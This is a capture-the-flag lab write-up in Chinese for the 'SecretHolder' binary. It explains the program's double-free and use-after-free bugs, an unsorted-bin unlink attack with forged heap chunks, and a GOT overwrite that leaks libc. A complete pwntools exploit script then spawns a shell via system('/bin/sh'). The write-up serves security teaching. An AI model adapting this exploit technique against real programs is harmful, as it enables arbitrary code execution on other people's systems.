# SecretHolder

*[執行程式]*

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/LAB3/image/secretholder_topic.jpg)

[解題]

首先可以透過執行程式看到其提供以下幾種功能:
* keep secret:有三種不同大小的空間，並依對應的大小輸入秘密到該空間。
* wipe secret:可以自行選擇要free掉哪種大小的空間。
* renew secret:重新創建某個大小的空間。

接下來可以用 ghidra 進行分析，其中看到比較有東西的程式畫面如下:

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/LAB3/image/secretholder_code.jpg)

在 keep secret 的函數中使用 calloc() 為三種 secret 分配不同大小的 chunk (small chunk、big chunk、huge chunk)，在分配前會檢查相對應的 secret 是否已經存在，因為每種 chunk 只能有一個。而在 wipe secret 函數在釋放 secret 時，首先將對應的 chunk 釋放掉，然後設置 flag 為 0。最後，renew secret 函數會先判斷對應的 flag 是否為 1，表示 secret 是否已經存在，如果不存在則讀入 secret，否則函數直接返回。

透過程式碼解析可以發現有以下漏洞:
* double-free:在 free chunk 的位置 calloc 另一個 chunk，表示可以重複 free 這個 chunk。
* use-after-free:因為 double-free 的的情況發生，所以 calloc 出來的那個 chunk 會被認為是 free 的，但它實際上卻可以使用。

因此，本題可以利用 unsorted bin 的 unlink 來攻擊。

我們先建一個 big chunk，然後在 free 這個 big chunk，接著再建一個 small chunk 和一個 medium chunk。三個 chunk 的狀態會呈現如下:

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/LAB3/image/secretholder_pic1.jpg)

接下來把 small chunk 和 medium chunk 都 free 掉，因為在分配 huge chunk 的時候，glibc 會調用函數 malloc_consolidate() 來清除 fastbin 中的 chunk，所以 medium chunk 會被放到了 small chunk 的位置，當再次分配 small chunk 時會造成堆塊重疊。因此，我们要對 medium 做 double free，我們要在 Small 的位置偽造假 chunk，也要重新建好 medium 的結構，還有在 medium 後面再偽造幾個假 chunk，繞過檢查。則現在的狀態如下:

![image](https://github.com/PenguinBear-cyber/The-Attack-and-Defense-of-Computer/blob/main/Practice/LAB3/image/secretholder_pic2.jpg)

再次 free 那個 medium，medium 就會與 Fake_chunk1 發生 unlink，這樣就能自由控制堆塊，把 free 的 got 表修改成 puts 的 plt 地址，當 free 時就能洩漏出訊息。

根據以上的敘述，exploit code 呈現如下:

#### exploit.py
```
from pwn import *
from LibcSearcher import *

sh = process('./SecretHolder')
elf = ELF('./SecretHolder')

# The address of huge_secret
huge_secret = 0x6020A8
bss_addr = 0x602090
free_got = elf.got['free']
puts_plt = elf.plt['puts']
read_got = elf.got['read']

def new(h_type, content):
   sh.sendlineafter('3. Renew secret', '1')
   sh.sendlineafter('3. Huge secret', str(h_type))
   sh.sendlineafter('Tell me your secret:', content)

def delete(h_type):
   sh.sendlineafter('3. Renew secret', '2')
   sh.sendlineafter('3. Huge secret', str(h_type))

def edit(h_type, content):
   sh.sendlineafter('3. Renew secret', '3')
   sh.sendlineafter('3. Huge secret', str(h_type))
   sh.sendafter('Tell me your secret:', content)

# apply one big chunk
new(3,'a'*0x100)
delete(3)

# apply one small chunk
new(1,'b'*0x10)

#apply one medium chunk
new(2,'c'*0x100)

# free chunk0 and chunk1
delete(1)
delete(2)

# create fake chunk
fake_chunk = p64(0) + p64(0x21)
#fd,bk
fake_chunk += p64(huge_secret-0x18) + p64(huge_secret-0x10)
payload = fake_chunk.ljust(0x20,'\x00')
#prev_size size
payload += p64(0x20) + p64(0x90) + 'c'*0x80   #chunk2
#prev_size size
payload += p64(0x90) + p64(0x81) + 'd'*0x70   #chunk3
#prev_size size
payload += p64(0) + p64(0x81)   #chunk4
# reapply big chunk
new(3, payload)

# unlink this 3 big bin
delete(2)
# Now, we can control this three heap pointer, modify them first
payload += p64(0) * 2 + p64(free_got) + p64(bss_addr) + p64(read_got) +p32(1)*3
edit(3,payload)

# modify free's got to put's plt
edit(2,p64(puts_plt))
#leakage the address of read
delete(1)
sh.recvuntil('\n')
read_addr = u64(sh.recvuntil('\n',drop = True).ljust(8,'\x00'))
libc = LibcSearcher('read',read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
print ('libc_base=',hex(read_addr))
print ('system_addr=',hex(system_addr))
#modify table got of free and point to system
edit(2,p64(system_addr))
#modify heap1 pointer and point to str(/bin/sh)
edit(3,p64(0) * 2 + p64(binsh_addr))
#system("/bin/sh")
delete(2)

sh.interactive()
```
